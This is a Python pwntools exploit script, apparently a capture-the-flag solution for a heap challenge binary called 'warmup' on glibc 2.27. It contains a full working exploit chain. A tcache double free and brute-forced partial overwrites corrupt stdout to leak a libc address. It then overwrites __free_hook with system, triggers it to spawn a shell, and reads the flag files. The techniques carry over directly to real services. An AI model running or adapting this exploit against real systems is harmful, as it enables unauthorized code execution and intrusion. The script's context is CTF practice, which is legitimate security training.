from pwn import *
# context.log_level = 'debug'

TARGET = './warmup'
HOST = '47.52.90.3'
PORT = 9999
LIBC = './libc-2.27.so'

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def add(content):
    r.sendline('1')
    r.sendafter('>>', content)
    return r.recvuntil('>>')

def delete(index):    
    r.sendline('2')
    r.sendlineafter('index:', str(index))
    r.recvuntil('>>')

def modify(index, content):
    r.sendline('3')
    r.sendlineafter('index:', str(index))
    r.sendafter('>>', content)
    r.recvuntil('>>')

# context.log_level = 'debug'
while(1): 
    log.info('try to hit heap addr ..')
    # r = remote(HOST, PORT)
    r = process(TARGET)
    r.recvuntil('>>')
    add('A'*8+p64(0x51)) #0 fake chunk for 0x420 sized freeing
    add('B'*8+p64(0x51)) #1 fake chunk for 0x420 sized freeing
    add('2222') #2 
    add('3333') #3 
    add('4444') #4 
    add('5555') #5 
    delete(2)
    delete(3)
    delete(3)
    add('\x50\x02') #2 next allocation will point to header of "size 0x410 chunk" with 1/16
    add('CCCC') #3
    try:
        add(p64(0)+p64(0x421)) #6 overwrite header of 0x421 chunk
    except:
        r.close()
        continue

    log.info('ok')
    log.info('try to hit stdout addr ..')

    delete(4)
    delete(5)
    delete(5)
    add('\x60\x02') #4 
    add('DDDD') #5
    add('\x00') #7 0x421 sized chunk
    delete(7) # leak main_arena

    modify(0x6, p64(0)+p64(0x51)+'\x50\x67') # point to stdout with 1/16 or higher
    delete(0)
    delete(0)
    delete(0)
    delete(1)
    delete(1)
    add('\x60\x02') #0 
    add('a') #1
    add('\x60') #8

    payload = ''
    payload += p64(0)
    payload += p64(0)
    payload += p64(0xfbad1800)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += '\x00'
    try:
        leak = u64(add(payload)[8:16]) #7
        assert leak != 0x642e320a2e646461
        break
    except:
        r.close()
        continue

# gdb.attach(r)
context.log_level = 'debug'

base = leak - (0x7f51a1ae78b0 - 0x00007f51a16fa000)
system = base + libc.sym['system']
free_hook = base + 0x3ed8e8
log.info('ok')
dbg("leak")
dbg("base")

# now \xe8\x78 will point free_hook

delete(1)
modify(0, p64(free_hook))
add('/bin/sh') #1

add(p64(system))
r.sendline('2')
r.sendlineafter('index:', '1')

sleep(1)
r.sendline('cat f*')
sleep(1)
r.sendline('ls') 
sleep(1)
r.sendline('pwd')

r.interactive()
